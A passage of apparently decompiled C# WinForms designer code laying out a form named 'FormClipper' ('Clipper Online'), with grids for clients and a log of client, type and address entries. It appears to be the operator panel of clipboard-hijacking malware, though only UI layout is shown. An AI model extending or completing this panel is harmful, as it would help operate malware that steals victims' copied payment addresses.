		this.GridLog.Name = "GridLog";
		this.GridLog.ReadOnly = true;
		this.GridLog.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle6.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle6.BackColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle6.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		dataGridViewCellStyle6.ForeColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle6.Padding = new System.Windows.Forms.Padding(1, 0, 0, 0);
		dataGridViewCellStyle6.SelectionBackColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle6.SelectionForeColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle6.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.GridLog.RowHeadersDefaultCellStyle = dataGridViewCellStyle6;
		this.GridLog.RowHeadersVisible = false;
		this.GridLog.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.GridLog.ShowCellErrors = false;
		this.GridLog.ShowCellToolTips = false;
		this.GridLog.ShowEditingIcon = false;
		this.GridLog.ShowRowErrors = false;
		this.GridLog.Size = new System.Drawing.Size(801, 359);
		this.GridLog.TabIndex = 34;
		this.ColumnClient.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.ColumnClient.HeaderText = "Client";
		this.ColumnClient.MinimumWidth = 150;
		this.ColumnClient.Name = "ColumnClient";
		this.ColumnClient.ReadOnly = true;
		this.ColumnClient.Width = 150;
		this.ColumnType.HeaderText = "Type";
		this.ColumnType.Name = "ColumnType";
		this.ColumnType.ReadOnly = true;
		this.ColumnAddress.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.ColumnAddress.HeaderText = "Address";
		this.ColumnAddress.Name = "ColumnAddress";
		this.ColumnAddress.ReadOnly = true;
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(807, 592);
		base.Controls.Add(this.GridLog);
		base.Controls.Add(this.GridClients);
		base.Controls.Add(this.panel1);
		base.Name = "FormClipper";
		this.Text = "Clipper           Online [0]";
		base.Load += new System.EventHandler(FormProcess_Load);
		((System.ComponentModel.ISupportInitialize)this.GridClients).EndInit();
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.GridLog).EndInit();
		base.ResumeLayout(false);
	}
}
